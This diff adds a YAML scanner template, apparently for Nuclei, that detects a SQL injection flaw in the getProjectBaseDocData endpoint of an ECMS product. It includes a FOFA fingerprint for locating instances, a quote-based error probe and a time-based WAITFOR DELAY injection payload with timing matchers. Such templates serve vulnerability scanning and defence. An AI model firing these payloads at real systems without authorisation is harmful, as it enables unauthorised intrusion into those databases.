@@ -1,0 +1,49 @@
+id: poc-yaml-gczj-ecms-getprojectbasedocdata-sqli
+info:
+  name: ECMS getProjectBaseDocData SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: ecms
+    fofa: app="易达科技-ECMS"
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /ecmsToBim/getProjectBaseDocData?taskId=1&isHide=&achieveDocName=1' HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - '"success":false'
+          - '你访问的页面出错'
+
+  - raw:
+      - |
+        GET /ecmsToBim/getProjectBaseDocData?taskId=1&isHide=&achieveDocName=1%27);WAITFOR%20DELAY%20%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"total":0,"rows":[]}'
+      - type: dsl
+        dsl:
+          - 'duration >= to_number(t1)'
+          - 'duration <= to_number(t2)'
